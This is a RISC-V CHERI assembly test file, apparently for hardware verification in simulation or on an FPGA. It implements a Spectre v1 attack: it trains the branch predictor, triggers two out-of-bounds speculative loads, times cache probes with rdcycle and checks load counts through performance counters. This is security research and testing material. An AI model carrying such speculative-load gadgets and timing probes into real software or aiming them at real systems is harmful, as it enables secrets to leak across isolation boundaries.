#include "../s_sources/hpm_macros.h"

.text

/*
Spectre-PHT-CHERI
Author: Franz Fuchs

It trains the history of a branch predictor such
that two loads are executed speculatively even
if the branch should not have been taken. This
is the Pattern History Table(PHT) variant of
Spectre, also known as Spectre v1. This is the
CHERI variant of s_sources/spec_pht.S

In simulation:
1st load: 0x0000000080001200
2nd load: 0x0000000080003200
*/

change_to_cap_mode:
  // set pcc flags such that capability encoding
  // mode is used
  // This is described in the CHERI Specification v7
  cspecialr ct3, pcc
  li t1, 1
  csetflags ct3, ct3, t1
#ifdef VCU_118
  li  t2, 0xc0000018
#else
  li  t2, 0x80000018
#endif
  csetoffset  ct3, ct3, t2
  cjr ct3

init_caps:

    /*
     * data capabilities
     */

#ifdef VCU_118
    // cs1 is a capability to [0xc0001000 - 0xc0002000]
    li  t2, 0xc0001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0xc0002000 - 0xc0003000]
    li  t2, 0xc0002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1
    // store value at 0(ct6)
    li t1, 0x20
    csd t1, 0(cs2)

    // these memory addresses are considered to be attacker
    // accessible as well (e.g. from another process)
    // cs5 is a capability to [0xc0003000 - 0xc0004000]
    li  t2, 0xc0003000
    cfromptr cs5, ddc, t2
    li t1, 0x1000
    csetbounds cs5, cs5, t1
#else
    // cs1 is a capability to [0x80001000 - 0x80002000]
    li  t2, 0x80001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0x80002000 - 0x80003000]
    li  t2, 0x80002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1
    // store value at 0(ct6)
    li t1, 0x20
    csd t1, 0(cs2)

    // these memory addresses are considered to be attacker
    // accessible as well (e.g. from another process)
    // cs5 is a capability to [0x80003000 - 0x80004000]
    li  t2, 0x80003000
    cfromptr cs5, ddc, t2
    li t1, 0x1000
    csetbounds cs5, cs5, t1
#endif

    /*
     * code capabilities
     */

    // PCC for spec_funct
    cllc cs3, spec_funct
    li t1, 0x100
    csetbounds cs3, cs3, t1

    // PCC for flush function
    cllc cs4, flush
    li t1, 0x100
    csetbounds cs4, cs4, t1

spec:

    // write zeroes to memory
    csd x0, 0(cs1)
    csd x0, 8(cs1)
    csd x0, 16(cs1)
    csd x0, 24(cs1)
    csd x0, 32(cs1)
    csd x0, 40(cs1)
    csd x0, 48(cs1)
    csd x0, 56(cs1)

    // call spec_funct often in order to train the
    // branch predictor. loop unrolled by hand to
    // avoid branch prediction on this loop
  
    // call spec_funct 8 times with
    // different parameters
    addi a0, x0, 0x0
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x1
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x2
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x3
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x4
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x5
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x6
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3
    addi a0, x0, 0x7
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3

    // flush cache again to evict
    // value loaded for comparison
    cjalr cra, cs4

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    HPM_M_READ_X (s10, 3)


    // fetch cache line of data to
    // be accessed speculatively into L1 cache
    li t1, 0x200
    cincoffset ct2, cs1, t1
    csd t1, 0(ct2)

    // this load needs to be finished
    // before continuing
    //fence rw, rw

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    //HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    //HPM_M_READ_X (s10, 3)

    // calls with parameters that should lead to
    // speculative execution
    addi a0, x0, 0x40
    cmove ca1, cs1
    cmove ca2, cs2
    cmove ca3, cs5
    cjalr cra, cs3

    HPM_M_READ_X (s11, 3)

probe:
#ifdef VCU_118
    li  t2, 0xc0003000
    li  t3, 0xc0070000
#else
    li  t2, 0x80003000
    li  t3, 0x80070000
#endif
    cfromptr ct2, ddc, t2
    cfromptr ct6, ddc, t3
    add t4, x0, x0
    addi t5, x0, 16
probe_loop:
    rdcycle t0
    cld t3, 0(ct2)
    rdcycle t1
    sub t1, t1, t0
    csd t1, 0(ct6)
    cincoffsetimm ct6, ct6, 8
    cincoffsetimm ct2, ct2, 64
    addi t4, t4, 1
    blt t4, t5, probe_loop
    nop
    nop

    // we expect 2 loads to have happened
    // one architectural load in spec_funct
    // one transient load in spec_funct, which
    // leaks the secret
    // NOTE: the first transient load is served
    // by a store buffer as confirmed by the
    // simulation trace
    HPM_CAP_TEST(s10, s11, 2)

infinite_loop:
    add t2, x0, x0
    beq t2, x0, infinite_loop

flush:
    // flush entire cache
    
    // use ddc for that
    // set to memory address not used by
    // other sections
#ifdef VCU_118
    li t2, 0xc0010000
#else
    li t2, 0x80010000
#endif
    li t3, 0x8000
    add t3, t2, t3
    cfromptr ct1, ddc, t2
flush_loop:
    cld t0, 0(ct1)
    cincoffsetimm ct1, ct1, 64
    cgetaddr t0, ct1
    ble t0, t3, flush_loop

    // fence instruction
    fence rw, rw
    cret


spec_funct:
    // function will speculatively execute memory loads
    // the first load will return an address
    // the second load will return the value at
    // the aforementioned address
    // expects index parameter in a0
    // expects data capability in ca1
    // expects compare value capability in ca2

    slli t1, a0, 3
    cincoffset ca1, ca1, t1
    cld t0, 0(ca2)
    bge a0, t0, spec_funct_end
    cld t2, 0(ca1)
    // use speculative execution
    cincoffset ca3, ca3, t2
    cld t2, 0(ca3)
spec_funct_end:
    cret

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
